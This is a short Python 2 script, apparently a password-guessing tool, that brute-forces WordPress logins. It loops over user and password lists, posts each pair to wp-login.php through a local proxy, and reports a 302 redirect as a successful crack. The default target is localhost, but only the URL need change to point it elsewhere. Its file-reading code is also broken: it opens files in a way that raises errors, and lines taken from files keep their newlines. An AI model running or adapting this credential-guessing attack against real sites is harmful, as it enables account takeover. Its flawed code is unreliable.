#coding: utf-8
import argparse,requests,sys
import requests



def get_request(user, passwd):
    url = 'http://localhost/wordpress/wp-login.php'
    proxy = {'http': '127.0.0.1:8080'}
    request_args={
        'data':{
            'log':user,
            'pwd':passwd,
            'wp-submit':'\u767B\u5F55',
        }
    }
    html = requests.post(url,data=request_args['data'],proxies=proxy,allow_redirects=False)
    if html.status_code == 302:
        print u'账号:%s 密码:%s 爆破成功'%(user,passwd)
    else:
        print u'爆破失败'

def args_un_disc(args):
    user = []
    if args.user:
        user.append(args.user)
    elif args.User:
        with open(args.User,'r').readlines() as r:
            for u in r:
                user.append(u)
                
    passwd = []
    if args.password:
        passwd.append(args.password)
    elif args.Password:
        with open(args.Password,'r').readlines() as r:
            for p in r:
                passwd.append(p)
    return user,passwd

def args_disc(args):
    user =[]
    passwd =[]
    with open(args.Dict).readlines() as r:
        for dic in r:
            dics =dic.split(':')
            user.append(dics[0])
            passwd.append(dics[-1])
    return user, passwd
        
    
def get_data():
    parser = argparse.ArgumentParser(description=u"[+]-----------------NO JS 批量爆破测试－python版-----------------[+]")
    parser.add_argument('-u', '--user',  help='specific one user')
    parser.add_argument('-p', '--password', help='specific one password')
    parser.add_argument('-U' , '--User', help='specific a directory file of users')
    parser.add_argument('-P','--Password',help='specific a directory file of passwords')
    parser.add_argument('-D', '--Dict', help='specific a dict file of users and passwords')
    args = parser.parse_args()
    if (args.user or args.User) and (args.password or args.Password) and not (args.Dict):
        return args_un_disc(args)
    elif not (args.user or args.User or args.password or args.Password) and args.Dict:
        return args_disc(args)
    else:
        print parser.parse_args(['-h'])
        sys.exit()
if __name__ == '__main__':
    user, passwd = get_data()
    for u in user:
        for p in passwd:
            get_request(u,p)
    